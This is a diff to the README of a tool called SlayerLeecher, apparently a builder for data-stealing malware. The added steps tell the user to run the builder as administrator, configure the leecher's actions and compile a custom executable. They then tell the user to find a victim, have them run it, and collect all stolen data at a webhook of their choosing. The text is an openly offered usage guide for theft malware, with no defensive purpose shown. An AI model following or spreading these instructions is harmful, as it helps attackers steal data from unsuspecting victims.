@@ -2,3 +2,9 @@ How to run SlayerLeecher.
 
   1) Download open source file (.zip)
   2) Run "Install.bat" to install all requirements needed for SlayerLeecher
+  3) Right-click SlayerLeecher.exe to run as administarator
+    a) You only need to run as administrator the first time you use this app, so it can access the installations from install.bat
+  4) Set up your customized leecher and select the actions you want it to take.
+  5) Once you compile, it will send the [yourleechername].exe file to whatever direcory that SlayerLeecher is in
+  6) Find a victim and have them run your leecher
+  7) All data will be send to the webhook that you specify in the setup process (step 4)
